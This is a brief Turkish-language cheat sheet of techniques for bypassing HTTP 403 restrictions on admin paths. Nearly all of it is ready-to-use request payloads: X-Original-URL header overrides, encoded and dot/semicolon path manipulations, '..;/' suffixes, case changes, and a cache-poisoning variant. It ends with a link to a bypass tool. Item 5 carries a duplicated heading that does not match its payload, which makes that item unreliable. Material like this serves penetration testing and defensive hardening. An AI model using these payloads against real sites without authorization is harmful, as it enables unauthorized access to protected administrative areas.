
## Bypass 403 

 1. "X-Original-URL" başlığını kullanma.

```bash
  GET /admin HTTP/1.1
  Host: target.com
```

bypass etmek için bunu deneyin.

```bash
  GET /anything HTTP/1.1
  Host: target.com
  X-Original-URL: /admin  
```

 2. İlk eğik çizgiden sonra %2e ekleniyor

```bash
  http://target.com/admin => 403
```

bypass etmek için bunu deneyin.

```bash
  http://target.com/%2e/admin => 200
```
 3. URL'ye nokta (.), eğik çizgi (/) ve noktalı virgül (;) eklemeyi deneyin

```bash
  http://target.com/admin => 403
```

bypass etmek için bunu deneyin.

```bash
http://target.com/secret/. => 200
http://target.com//secret// => 200
http://target.com/./secret/.. => 200
http://target.com/;/secret => 200
http://target.com/.;/secret => 200
http://target.com//;//secret => 200
```
 4. Dizin adından sonra "..;/" ekleyin

```bash
  http://target.com/admin
```

bypass etmek için bunu deneyin.

```bash
  http://target.com/admin..;/
```
 5. Dizin adından sonra "..;/" ekleyin

```bash
  http://target.com/admin
```

bypass etmek için bunu deneyin.

```bash
  http://target.com/aDmIN
```
 6. Web Önbelleği Zehirlenmesi Yoluyla

```bash
  GET /anything HTTP/1.1
  Host: victim.com
  X­-Original-­URL: /admin
```

  
## Bypass-403 TOOL
https://github.com/daffainfo/bypass-403

  